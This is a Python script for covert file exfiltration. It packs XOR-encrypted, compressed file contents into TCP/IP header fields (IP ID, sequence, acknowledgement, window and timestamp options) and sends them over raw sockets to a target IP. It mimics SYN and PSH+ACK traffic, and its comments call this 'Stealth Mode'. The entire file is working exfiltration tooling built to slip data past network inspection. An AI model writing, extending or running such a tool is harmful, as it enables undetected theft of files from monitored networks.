import socket
import struct
import sys
import threading
import time
import os
import argparse
import random
import zlib
import binascii

def checksum(msg):
    s = 0
    if len(msg) % 2 == 1:
        msg += b'\x00'
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s = s + w
    s = (s>>16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s

def get_virtual_header(source_ip, dest_ip, tcp_len):
    source_addr = socket.inet_aton(source_ip)
    dest_addr = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    return struct.pack('!4s4sBBH', source_addr, dest_addr, placeholder, protocol, tcp_len)

def xor_encrypt(data, key):
    key_bytes = key.encode('utf-8')
    encrypted = bytearray()
    for i in range(len(data)):
        encrypted.append(data[i] ^ key_bytes[i % len(key_bytes)])
    return bytes(encrypted)

def create_packet(source_ip, dest_ip, src_port, dst_port, chunk, tcp_flags):
    # Chunk size is now 20 bytes (URG removed)
    # 0-2: IP ID
    # 2-6: SEQ
    # 6-10: ACK
    # 10-12: WIN
    # 12-16: Timestamp Val
    # 16-20: Timestamp ECR
    
    ip_id = int.from_bytes(chunk[0:2], 'big')
    tcp_seq = int.from_bytes(chunk[2:6], 'big')
    tcp_ack = int.from_bytes(chunk[6:10], 'big')
    tcp_win = int.from_bytes(chunk[10:12], 'big')
    # URG removed (chunk index 12-14 gone)
    ts_val = int.from_bytes(chunk[12:16], 'big')
    ts_ecr = int.from_bytes(chunk[16:20], 'big')
    
    tcp_urg = 0 

    data_offset_words = 5 + 3 # 32 bytes
    tcp_offset_res = (data_offset_words << 4) + 0

    # IP Header
    ip_ihl_ver = 0x45
    ip_tos = 0
    ip_tot_len = 20 + 32 
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, 0, ip_saddr, ip_daddr)

    # TCP Options
    tcp_options = struct.pack('!BBBBII', 1, 1, 8, 10, ts_val, ts_ecr)

    # TCP Header
    tcp_check = 0
    BASE_TCP_HEADER_FMT = '!HHLLBBHHH'
    
    tcp_header_no_check = struct.pack(BASE_TCP_HEADER_FMT, src_port, dst_port, tcp_seq, tcp_ack, tcp_offset_res, tcp_flags, tcp_win, tcp_check, tcp_urg)
    
    pseudo_header = get_virtual_header(source_ip, dest_ip, 32)
    full_tcp_blob = tcp_header_no_check + tcp_options
    
    tcp_check = checksum(pseudo_header + full_tcp_blob)
    
    tcp_header = struct.pack(BASE_TCP_HEADER_FMT, src_port, dst_port, tcp_seq, tcp_ack, tcp_offset_res, tcp_flags, tcp_win, tcp_check, tcp_urg)
    
    return ip_header + tcp_header + tcp_options

def send_file(filename, target_ip, target_port, key):
    if not os.path.exists(filename):
        print(f"File {filename} not found.")
        return

    basename = os.path.basename(filename).encode('utf-8')
    with open(filename, 'rb') as f:
        body = f.read()
        
    # INTEGRITY: Append CRC32 (4 bytes) to body
    file_checksum = zlib.crc32(body)
    integrity_trailer = struct.pack('!I', file_checksum)
    
    # Format: [Name][0x00][Body][CRC32]
    raw_data = basename + b'\x00' + body + integrity_trailer
    
    # Compress
    compressed_data = zlib.compress(raw_data)
    compressed_size = len(compressed_data)
    
    print(f"Sending {filename}")
    print(f"  Integrity Checksum (CRC32): {hex(file_checksum)}")
    
    # Payload
    payload = struct.pack('!Q', compressed_size) + compressed_data
    encrypted = xor_encrypt(payload, key)
    
    # Pad to 20 bytes (Stealth Mode: No URG)
    CHUNK_SIZE = 20
    remainder = len(encrypted) % CHUNK_SIZE
    if remainder:
        padding = CHUNK_SIZE - remainder
        encrypted += b'\x00' * padding
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("Error: Requires root privileges (sudo).")
        return

    src_port = random.randint(1024, 65000)
    local_ip = "127.0.0.1" 
    
    chunks = [encrypted[i:i+CHUNK_SIZE] for i in range(0, len(encrypted), CHUNK_SIZE)]
    
    for i, chunk in enumerate(chunks):
        # MIMIC LOGIC:
        # Pkt 1: SYN (0x02)
        # Pkt 2+: PSH+ACK (0x18)
        # Note: We do NOT use URG flag anymore.
        if i == 0:
            flags = 0x02 
        else:
            flags = 0x18 
            
        packet = create_packet(local_ip, target_ip, src_port, target_port, chunk, flags)
        s.sendto(packet, (target_ip, 0))
        time.sleep(0.01) # Basic rate limit
        
    time.sleep(1)
    print(f"Sent {filename} via Port {src_port}.")
    s.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help='Target IP')
    parser.add_argument('--port', type=int, default=8080, help='Target Port')
    parser.add_argument('--key', required=True, help='Encryption Key')
    parser.add_argument('files', nargs='+', help='Files to send')
    
    args = parser.parse_args()
    
    threads = []
    for f in args.files:
        t = threading.Thread(target=send_file, args=(f, args.target, args.port, args.key))
        t.start()
        threads.append(t)
        time.sleep(0.5)
        
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
